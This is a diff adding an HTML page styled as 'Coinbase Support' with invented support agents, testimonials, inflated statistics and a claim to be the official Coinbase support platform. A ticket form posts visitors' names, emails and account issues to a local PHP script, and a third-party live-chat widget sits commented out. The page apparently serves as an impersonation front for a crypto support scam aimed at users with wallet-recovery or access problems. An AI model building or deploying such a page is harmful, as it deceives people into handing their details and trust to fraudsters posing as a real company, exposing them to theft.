@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coinbase Support - 24/7 Customer Service</title>
+    <link href="images/favicon.png" rel="icon" type="image/x-icon">
+  <!-- Bootstrap CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap%405.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <!-- Bootstrap Icons -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons%401.11.3/font/bootstrap-icons.css" rel="stylesheet">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f8f9fa;
+            color: #333;
+            line-height: 1.6;
+        }
+    .brand-badge{
+      display: inline-flex; align-items: center; gap: .5rem;
+      padding: .35rem .6rem;
+      border-radius: 999px;
+      background: #e8f0ff;
+      color: var(--cb-blue);
+      font-weight: 700;
+      letter-spacing: .2px;
+    }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background-color: white;
+            color: #333;
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            color: #0052cc;
+        }
+        
+        .logo i {
+            margin-right: 10px;
+            color: #f7931a; /* Bitcoin orange color */
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+        }
+        
+        nav ul li {
+            margin-left: 25px;
+        }
+        
+        nav ul li a {
+            color: #333;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            font-size: 16px;
+        }
+        
+        nav ul li a:hover {
+            color: #0052cc;
+        }
+        
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(rgba(0, 82, 204, 0.9), rgba(51, 133, 255, 0.9)), url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%230052cc" opacity="0.1"/><path d="M0 0L100 100" stroke="%23ffffff" stroke-width="1" opacity="0.1"/><path d="M100 0L0 100" stroke="%23ffffff" stroke-width="1" opacity="0.1"/></svg>');
+            color: white;
+            text-align: center;
+            padding: 100px 20px;
+            position: relative;
+        }
+        
+        .bitcoin-logo {
+            font-size: 60px;
+            color: #eeeeeeff;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .hero-content {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+        
+        .hero p {
+            font-size: 20px;
+            margin: 0 auto 30px;
+            max-width: 600px;
+            opacity: 0.9;
+        }
+        
+        .cta-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 16px 32px;
+            border-radius: 30px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s;
+            display: inline-block;
+            font-size: 16px;
+            text-align: center;
+            min-width: 200px;
+        }
+        
+        .btn-primary {
+            background-color: white;
+            color: #0052cc;
+            border: 2px solid white;
+        }
+        
+        .btn-primary:hover {
+            background-color: transparent;
+            color: white;
+            transform: translateY(-2px);
+        }
+        
+        .btn-outline {
+            background-color: transparent;
+            color: white;
+            border: 2px solid white;
+        }
+        
+        .btn-outline:hover {
+            background-color: white;
+            color: #0052cc;
+            transform: translateY(-2px);
+        }
+        
+        /* Stats Section */
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            background-color: white;
+            padding: 40px 20px;
+            border-radius: 12px;
+            margin-top: -40px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .stat-item {
+            text-align: center;
+            padding: 20px;
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .stat-number {
+            font-size: 42px;
+            font-weight: 800;
+            color: #0052cc;
+            margin-bottom: 10px;
+        }
+        
+        .stat-label {
+            font-size: 16px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        /* About Section */
+        .section {
+            padding: 80px 0;
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+        
+        .section-title h2 {
+            font-size: 36px;
+            color: #0052cc;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .section-title p {
+            font-size: 18px;
+            color: #666;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-top: 40px;
+        }
+        
+        .feature {
+            flex: 1;
+            min-width: 250px;
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            text-align: center;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .feature:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        .feature i {
+            font-size: 48px;
+            color: #0052cc;
+            margin-bottom: 20px;
+        }
+        
+        .feature h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+        
+        .feature p {
+            color: #666;
+        }
+        
+        /* Support Team */
+        .team {
+            background-color: #f0f7ff;
+        }
+        
+        .team-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        
+        .team-member {
+            background-color: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .team-member:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        .member-header {
+            padding: 25px 25px 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .member-avatar {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0052cc 0%, #3385ff 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            color: white;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+        
+        .member-info h3 {
+            font-size: 20px;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .member-info p {
+            color: #666;
+            font-size: 15px;
+        }
+        
+        .status {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-left: 10px;
+        }
+        
+        .online {
+            background-color: #4cd964;
+        }
+        
+        .busy {
+            background-color: #ff3b30;
+        }
+        
+        .member-details {
+            padding: 0 25px 25px;
+        }
+        
+        .member-details p {
+            color: #666;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+        
+        .specialties {
+            margin-top: 15px;
+        }
+        
+        .specialties h4 {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .specialties ul {
+            list-style: none;
+        }
+        
+        .specialties li {
+            padding: 5px 0;
+            color: #666;
+            font-size: 15px;
+            position: relative;
+            padding-left: 20px;
+        }
+        
+        .specialties li:before {
+            content: "•";
+            color: #0052cc;
+            position: absolute;
+            left: 0;
+            font-size: 20px;
+        }
+        
+        .chat-btn {
+            display: block;
+            width: 100%;
+            text-align: center;
+            background-color: #0052cc;
+            color: white;
+            padding: 14px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        
+        .chat-btn:hover {
+            background-color: #003d99;
+        }
+        
+        /* Support Stats */
+        .support-stats {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin: 50px 0;
+        }
+        
+        .support-stat {
+            text-align: center;
+            padding: 20px;
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .support-stat i {
+            font-size: 48px;
+            color: #0052cc;
+            margin-bottom: 15px;
+        }
+        
+        .support-stat h3 {
+            font-size: 42px;
+            color: #0052cc;
+            margin-bottom: 10px;
+            font-weight: 800;
+        }
+        
+        .support-stat p {
+            color: #666;
+            font-weight: 500;
+        }
+        
+        /* Immediate Help */
+        .immediate-help {
+            text-align: center;
+            background: linear-gradient(135deg, #0052cc 0%, #3385ff 100%);
+            color: white;
+            padding: 80px 40px;
+            border-radius: 12px;
+            margin: 60px 0;
+        }
+        
+        .immediate-help h2 {
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+        
+        .immediate-help p {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 30px;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        /* Testimonials */
+        .testimonials {
+            background-color: #f0f7ff;
+        }
+        
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 30px;
+        }
+        
+        .testimonial {
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .testimonial-text {
+            font-style: italic;
+            color: #444;
+            margin-bottom: 20px;
+            position: relative;
+            padding: 0 20px;
+            line-height: 1.8;
+        }
+        
+        .testimonial-text:before,
+        .testimonial-text:after {
+            content: """;
+            font-size: 60px;
+            color: #0052cc;
+            opacity: 0.2;
+            position: absolute;
+            line-height: 1;
+        }
+        
+        .testimonial-text:before {
+            top: -10px;
+            left: 0;
+        }
+        
+        .testimonial-text:after {
+            content: """;
+            bottom: -40px;
+            right: 0;
+        }
+        
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+        }
+        
+        .author-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0052cc 0%, #3385ff 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: white;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+        
+        .author-info h4 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+        
+        .author-info p {
+            color: #666;
+            font-size: 15px;
+        }
+        
+        /* Feedback Section */
+        .feedback {
+            text-align: center;
+            padding: 60px 20px;
+            background-color: white;
+            border-radius: 12px;
+            margin: 40px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .feedback h3 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            color: #0052cc;
+        }
+        
+        .feedback p {
+            color: #666;
+            margin-bottom: 30px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        /* Footer */
+        footer {
+            background-color: #00264d;
+            color: white;
+            padding: 80px 0 30px;
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .footer-column h3 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: white;
+        }
+        
+        .footer-column p {
+            color: #ccc;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .footer-column ul {
+            list-style: none;
+        }
+        
+        .footer-column ul li {
+            margin-bottom: 12px;
+        }
+        
+        .footer-column ul li a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s;
+            font-size: 15px;
+        }
+        
+        .footer-column ul li a:hover {
+            color: white;
+        }
+        
+        .footer-bottom {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid #004080;
+            color: #ccc;
+            font-size: 15px;
+        }
+        
+        .footer-bottom p {
+            margin-bottom: 10px;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            nav ul {
+                margin-top: 20px;
+                justify-content: center;
+                flex-wrap: wrap;
+            }
+            
+            nav ul li {
+                margin: 0 10px 10px;
+            }
+            
+            .hero {
+                padding: 80px 20px;
+            }
+            
+            .hero h1 {
+                font-size: 36px;
+            }
+            
+            .hero p {
+                font-size: 18px;
+            }
+            
+            .cta-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn {
+                width: 100%;
+                max-width: 300px;
+            }
+            
+            .stats, .support-stats {
+                flex-direction: column;
+            }
+            
+            .stat-item, .support-stat {
+                margin-bottom: 30px;
+            }
+            
+            .feature {
+                min-width: 100%;
+            }
+            
+            .team-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .testimonial-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        /* Animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .animate {
+            animation: fadeIn 0.8s ease-out forwards;
+        }
+        
+        .delay-1 { animation-delay: 0.2s; }
+        .delay-2 { animation-delay: 0.4s; }
+        .delay-3 { animation-delay: 0.6s; }
+        
+    </style>
+
+</head>
+<body>
+    <!-- Header with white navigation bar -->
+    <header>
+        <div class="container header-content">
+            <a class="navbar-brand d-flex align-items-center gap-2" href="#top" aria-label="Coinbase Support Home">
+        <span class="brand-badge"><i class="bi bi-shield-check"></i> Coinbase Support</span>
+      </a>
+            <nav>
+                <ul>
+                    <li><a href="#contact">Support</a></li>
+                    <li><a href="#contact">Help Center</a></li>
+                    <li><a href="#contact">Contact</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container hero-content">
+            <div class="bitcoin-logo">
+                <i class="fab fa-bitcoin"></i>
+            </div>
+            <h1 class="animate">Welcome to Coinbase Support</h1>
+            <p class="animate delay-1">Get 24/7 assistance with your Coinbase account, transactions, and crypto journey from our expert support team.</p>
+            <div class="cta-buttons">
+                <a href="#contact" class="btn btn-primary animate delay-2">Open a Support Ticket</a>
+                <a href="#contact" class="btn btn-outline animate delay-2">Browse Help Center</a>
+            </div>
+        </div>
+    </section>
+
+    <div class="container">
+        <div class="stats">
+            <div class="stat-item animate delay-1">
+                <div class="stat-number">110M+</div>
+                <div class="stat-label">Verified Users</div>
+            </div>
+            <div class="stat-item animate delay-2">
+                <div class="stat-number">100+</div>
+                <div class="stat-label">Countries</div>
+            </div>
+            <div class="stat-item animate delay-3">
+                <div class="stat-number">$130B+</div>
+                <div class="stat-label">Assets Protected</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- About Section -->
+    <section class="section">
+        <div class="container">
+            <div class="section-title">
+                <h2 class="animate">About Coinbase</h2>
+                <p class="animate delay-1">Coinbase is a global cryptocurrency platform trusted by over 110 million users in 100+ countries. We provide secure, easy-to-use tools for buying, selling, and managing digital assets.</p>
+            </div>
+            
+            <div class="features">
+                <div class="feature animate delay-1">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Bank-Level Security</h3>
+                    <p>Advanced encryption and cold storage protection for your digital assets.</p>
+                </div>
+                <div class="feature animate delay-2">
+                    <i class="fas fa-globe"></i>
+                    <h3>Global Presence</h3>
+                    <p>Trusted by users in 100+ countries around the world.</p>
+                </div>
+                <div class="feature animate delay-3">
+                    <i class="fas fa-bolt"></i>
+                    <h3>Fast Transactions</h3>
+                    <p>Lightning-fast and reliable trading with minimal fees.</p>
+                </div>
+                <div class="feature animate">
+                    <i class="fas fa-mobile-alt"></i>
+                    <h3>User-Friendly Apps</h3>
+                    <p>Intuitive mobile and web platforms for seamless trading.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Support Team -->
+    <section class="section team">
+        <div class="container">
+            <div class="section-title">
+                <h2 class="animate">Meet Our Support Team</h2>
+                <p class="animate delay-1">Our expert support representatives are here to help you with any questions or issues. Each team member brings specialized knowledge and years of experience.</p>
+            </div>
+            
+            <div class="team-grid">
+                <div class="team-member animate">
+                    <div class="member-header">
+                        <div class="member-avatar">SM</div>
+                        <div class="member-info">
+                            <h3>Sarah M. <span class="status online"></span></h3>
+                            <p>ID Verification Expert</p>
+                        </div>
+                    </div>
+                    <div class="member-details">
+                        <p>With 5+ years in crypto support, I help users resolve verification issues quickly and securely. Your identity safety is my top priority.</p>
+                        <div class="specialties">
+                            <h4>Specialties</h4>
+                            <ul>
+                                <li>KYC Verification</li>
+                                <li>Document Review</li>
+                                <li>Identity Security</li>
+                            </ul>
+                        </div>
+                        <a href="#" class="chat-btn">Chat Now</a>
+                    </div>
+                </div>
+                
+                <div class="team-member animate delay-1">
+                    <div class="member-header">
+                        <div class="member-avatar">JL</div>
+                        <div class="member-info">
+                            <h3>James L. <span class="status online"></span></h3>
+                            <p>Wallet Recovery Specialist</p>
+                        </div>
+                    </div>
+                    <div class="member-details">
+                        <p>Specializing in wallet recovery and account access issues. I've helped thousands of users regain access to their crypto safely.</p>
+                        <div class="specialties">
+                            <h4>Specialties</h4>
+                            <ul>
+                                <li>Account Recovery</li>
+                                <li>2FA Issues</li>
+                                <li>Wallet Security</li>
+                            </ul>
+                        </div>
+                        <a href="#" class="chat-btn">Chat Now</a>
+                    </div>
+                </div>
+                
+                <div class="team-member animate delay-2">
+                    <div class="member-header">
+                        <div class="member-avatar">AK</div>
+                        <div class="member-info">
+                            <h3>Anita K. <span class="status online"></span></h3>
+                            <p>Payment & Withdrawal Support</p>
+                        </div>
+                    </div>
+                    <div class="member-details">
+                        <p>Expert in payment processing and withdrawal issues. I ensure your transactions are smooth and secure every time.</p>
+                        <div class="specialties">
+                            <h4>Specialties</h4>
+                            <ul>
+                                <li>Bank Transfers</li>
+                                <li>Payment Issues</li>
+                                <li>Withdrawal Support</li>
+                            </ul>
+                        </div>
+                        <a href="#" class="chat-btn">Chat Now</a>
+                    </div>
+                </div>
+                
+                <div class="team-member animate delay-3">
+                    <div class="member-header">
+                        <div class="member-avatar">MD</div>
+                        <div class="member-info">
+                            <h3>Mike D. <span class="status busy"></span></h3>
+                            <p>Fraud & Security Help Desk</p>
+                        </div>
+                    </div>
+                    <div class="member-details">
+                        <p>Cybersecurity specialist focused on fraud prevention and account protection. Your security is my mission.</p>
+                        <div class="specialties">
+                            <h4>Specialties</h4>
+                            <ul>
+                                <li>Fraud Prevention</li>
+                                <li>Security Alerts</li>
+                                <li>Account Protection</li>
+                            </ul>
+                        </div>
+                        <a href="#" class="chat-btn">Chat Now</a>
+                    </div>
+                </div>
+                
+                <div class="team-member animate">
+                    <div class="member-header">
+                        <div class="member-avatar">LR</div>
+                        <div class="member-info">
+                            <h3>Lisa R. <span class="status online"></span></h3>
+                            <p>Senior Crypto Support Specialist</p>
+                        </div>
+                    </div>
+                    <div class="member-details">
+                        <p>With 5+ years in crypto support, I help users resolve issues quickly and securely. Your satisfaction and safety are my top priorities.</p>
+                        <div class="specialties">
+                            <h4>Specialties</h4>
+                            <ul>
+                                <li>Trading Support</li>
+                                <li>Technical Issues</li>
+                                <li>Platform Navigation</li>
+                            </ul>
+                        </div>
+                        <a href="#" class="chat-btn">Chat Now</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="support-stats">
+                <div class="support-stat animate">
+                    <i class="fas fa-clock"></i>
+                    <h3>24/7</h3>
+                    <p>Support Available</p>
+                </div>
+                <div class="support-stat animate delay-1">
+                    <i class="fas fa-stopwatch"></i>
+                    <h3>&lt;2h</h3>
+                    <p>Average Response</p>
+                </div>
+                <div class="support-stat animate delay-2">
+                    <i class="fas fa-smile"></i>
+                    <h3>98%</h3>
+                    <p>Satisfaction Rate</p>
+                </div>
+                <div class="support-stat animate delay-3">
+                    <i class="fas fa-users"></i>
+                    <h3>50+</h3>
+                    <p>Support Experts</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Immediate Help Section -->
+    <div class="container">
+        <div class="immediate-help">
+            <h2 class="animate">Need Help Right Now?</h2>
+            <p class="animate delay-1">Our support team is standing by to assist you with any issues or questions about your Coinbase account.</p>
+            <div class="cta-buttons">
+                <a href="#" class="btn btn-primary animate delay-2">Start Live Chat</a>
+                <a href="#" class="btn btn-outline animate delay-2">Open Support Ticket</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Testimonials -->
+    <section class="section testimonials">
+        <div class="container">
+            <div class="section-title">
+                <h2 class="animate">What Our Customers Say</h2>
+                <p class="animate delay-1">Read real experiences from Coinbase users around the world who received exceptional support</p>
+            </div>
+            
+            <div class="support-stats">
+                <div class="support-stat animate">
+                    <i class="fas fa-star"></i>
+                    <h3>4.9</h3>
+                    <p>Average Rating</p>
+                </div>
+                <div class="support-stat animate delay-1">
+                    <i class="fas fa-user-check"></i>
+                    <h3>25K+</h3>
+                    <p>Happy Customers</p>
+                </div>
+                <div class="support-stat animate delay-2">
+                    <i class="fas fa-check-circle"></i>
+                    <h3>98%</h3>
+                    <p>Resolution Rate</p>
+                </div>
+                <div class="support-stat animate delay-3">
+                    <i class="fas fa-globe-americas"></i>
+                    <h3>100+</h3>
+                    <p>Countries Served</p>
+                </div>
+            </div>
+            
+            <div class="testimonial-grid">
+                <div class="testimonial animate">
+                    <div class="testimonial-text">
+                        Coinbase helped me recover my account in under 24 hours. Their support team was incredibly responsive and walked me through every step. Couldn't be happier!
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">AO</div>
+                        <div class="author-info">
+                            <h4>Alex O.</h4>
+                            <p>San Diego, USA</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="testimonial animate delay-1">
+                    <div class="testimonial-text">
+                        I was impressed by how easy it was to contact someone during a wallet issue. Fast and secure! The support team understood my problem immediately.
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">BA</div>
+                        <div class="author-info">
+                            <h4>Blessing A.</h4>
+                            <p>Colombia</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="testimonial animate delay-2">
+                    <div class="testimonial-text">
+                        Great support, clean interface, and fast resolution. I trust Coinbase completely! They handled my verification issue with professionalism.
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">EC</div>
+                        <div class="author-info">
+                            <h4>Emma C.</h4>
+                            <p>London, UK</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="feedback" id="contact">
+                <h3 class="animate">Share Your Experience</h3>
+                <p class="animate delay-1">Have you received great support from our team? We'd love to hear about your experience!</p>
+                <form id="supportForm" novalidate>
+              <div class="row g-3">
+                <div class="col-md-6">
+                  <label class="form-label" for="name">Full name</label>
+                  <input id="name" name="name" type="text" class="form-control" placeholder="Jane Doe" required>
+                  <div class="invalid-feedback">Please enter your name.</div>
+                </div>
+                <div class="col-md-6">
+                  <label class="form-label" for="email">Email</label>
+                  <input id="email" name="email" type="email" class="form-control" placeholder="you@example.com" required>
+                  <div class="invalid-feedback">Please enter a valid email.</div>
+                </div>
+                <div class="col-md-6">
+                  <label class="form-label" for="subject">Subject</label>
+                  <select id="subject" name="subject" class="form-select" required>
+                    <option value="">Choose a topic</option>
+                    <option>Account access</option>
+                    <option>Verification</option>
+                    <option>Security</option>
+                    <option>Transactions</option>
+                    <option>Technical issue</option>
+                    <option>Other</option>
+                  </select>
+                  <div class="invalid-feedback">Please select a subject.</div>
+                </div>
+                <div class="col-md-6">
+                  <label class="form-label" for="priority">Priority</label>
+                  <select id="priority" name="priority" class="form-select" required>
+                    <option value="">Select urgency</option>
+                    <option>Low</option>
+                    <option>Normal</option>
+                    <option>High</option>
+                    <option>Critical</option>
+                  </select>
+                  <div class="invalid-feedback">Please select a priority.</div>
+                </div>
+                <div class="col-12">
+                  <label class="form-label" for="message">Message</label>
+                  <textarea id="message" name="message" class="form-control" rows="5" placeholder="Describe your issue…" required></textarea>
+                  <div class="invalid-feedback">Please describe your issue.</div>
+                </div>
+                <div class="col-12 d-flex flex-wrap gap-2 align-items-center">
+                  <button class="btn btn-primary" type="submit"><i class="bi bi-send me-2"></i>Submit ticket</button>
+                  <!--<button class="btn btn-outline-secondary" type="button" id="btnLiveChat"><i class="bi bi-chat-dots me-2"></i>Live chat</button>-->
+                  <small class="text-secondary ms-auto"><i class="bi bi-shield-lock me-1"></i> We’ll never share your details.</small>
+                </div>
+              </div>
+            </form>
+             <!-- SweetAlert + jQuery (keep once on the page) -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<script>
+$(function () {
+  $("#supportForm").on("submit", function (e) {
+    e.preventDefault();
+
+    const $form = $(this);
+    const submitBtn = $form.find('button[type="submit"]');
+
+    // Basic client-side check (optional but nice)
+    const required = ["#name", "#email", "#subject", "#priority", "#message"];
+    for (const sel of required) {
+      if (!$(sel).val()) {
+        $(sel)[0].reportValidity?.();
+        return;
+      }
+    }
+
+    submitBtn.prop("disabled", true).html('<i class="bi bi-hourglass-split me-2"></i>Submitting...');
+
+    $.ajax({
+      url: "send_ticket.php",
+      method: "POST",
+      data: $form.serialize(),
+      // Don't force dataType to "json"; we’ll parse to avoid parseerror if PHP prints warnings.
+      success: function (data, textStatus, jqXHR) {
+        let res = data;
+        if (typeof data === "string") {
+          try { res = JSON.parse(data); } catch (e) {
+            console.error("JSON parse error:", e, data);
+            Swal.fire("Error", "Server returned an invalid response.", "error");
+            return;
+          }
+        }
+
+        if (res.status === "success") {
+          Swal.fire({
+            icon: "success",
+            title: "Ticket Submitted!",
+            text: "We’ve received your request. Our team will contact you shortly.",
+            confirmButtonColor: "#3085d6"
+          });
+          $form[0].reset();
+        } else {
+          Swal.fire("Error", res.message || "Something went wrong. Please try again later.", "error");
+        }
+      },
+      error: function (jqXHR, textStatus, errorThrown) {
+        console.error("AJAX error:", textStatus, errorThrown, jqXHR.responseText);
+        Swal.fire("Error", "Something went wrong. Please try again later.", "error");
+      },
+      complete: function () {
+        submitBtn.prop("disabled", false).html('<i class="bi bi-send me-2"></i>Submit ticket');
+      }
+    });
+  });
+});
+</script>
+
+
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <i class="bi bi-shield-check"></i> Coinbase</span>
+                    <p>Experience the official Coinbase support platform with enterprise-grade security, 24/7 assistance, and access to the world's most trusted cryptocurrency ecosystem.</p>
+                    <!-- <div class="stats"> -->
+                        <!-- <div class="stat-item">
+                            <div class="stat-number">110M+</div>
+                            <div class="stat-label">Verified Users</div>
+                        </div> -->
+                        <!-- <div class="stat-item">
+                            <div class="stat-number">100+</div>
+                            <div class="stat-label">Countries</div>
+                        </div> -->
+                        <!-- <div class="stat-item">
+                            <div class="stat-number">$130B+</div>
+                            <div class="stat-label">Assets Protected</div>
+                        </div> -->
+                    <!-- </div> -->
+                </div>
+                
+                <div class="footer-column">
+                    <h3>How We Support You</h3>
+                    <p>Our comprehensive support system is designed to help you at every step of your crypto journey.</p>
+                    <ul>
+                        <li><a href="#">24/7 Support</a></li>
+                        <li><a href="#">Live Chat</a></li>
+                        <li><a href="#">Expert Resolution</a></li>
+                        <li><a href="#">Help Center</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h3>Ready to Get Started?</h3>
+                    <p>Access your support dashboard or browse our comprehensive help center to find the answers you need.</p>
+                    <div class="cta-buttons">
+                        <a href="#" class="btn btn-primary">Open a Support Ticket</a>
+                        <a href="#" class="btn btn-outline">Help Center</a>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>© 2025 Coinbase Support. All rights reserved.</p>
+                <p>We're here to assist you with anything related to your Coinbase experience – from account access to transaction issues.</p>
+                <p>Secure. Trusted. 24/7 Assistance.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Simple JavaScript for interactive elements
+        document.addEventListener('DOMContentLoaded', function() {
+        
+            
+            // Animation on scroll
+            const animatedElements = document.querySelectorAll('.animate');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.style.opacity = 1;
+                        entry.target.style.transform = 'translateY(0)';
+                    }
+                });
+            }, {
+                threshold: 0.1
+            });
+            
+            animatedElements.forEach(element => {
+                element.style.opacity = 0;
+                element.style.transform = 'translateY(20px)';
+                element.style.transition = 'opacity 0.8s ease-out, transform 0.8s ease-out';
+                observer.observe(element);
+            });
+        });
+    </script>
+    
+<!-- Begin of Chaport Live Chat code
+<script type="text/javascript">
+(function(w,d,v3){
+w.chaportConfig = {
+appId : '68e511642489c089b381767b',
+};
+
+if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
+</script>
+<!-- End of Chaport Live Chat code -->
+   -->
+
